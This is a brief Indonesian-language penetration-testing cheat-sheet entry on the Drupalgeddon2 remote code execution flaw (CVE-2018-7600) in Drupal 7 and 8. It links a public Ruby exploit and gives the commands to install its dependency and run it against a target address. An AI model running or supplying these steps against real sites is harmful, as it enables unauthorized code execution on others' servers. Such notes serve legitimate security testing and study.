## RCE Drupal Versi 7 & 8
**CVE-2018-7600 | Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x? - 'Drupalgeddon2' RCE (SA-CORE-2018-002)**

Jika kamu menemukan Drupal versi 7 atau 8 maka langsung bisa gunakan Drupalgeddon untuk exploit dan RCE
https://github.com/dreadlocked/Drupalgeddon2

Jangan lupa install library via gem
```
sudo gem install highline
```
Lalu jalankan Drupalgeddon
```
ruby drupalgeddon2.rb https://192.168.11.1
```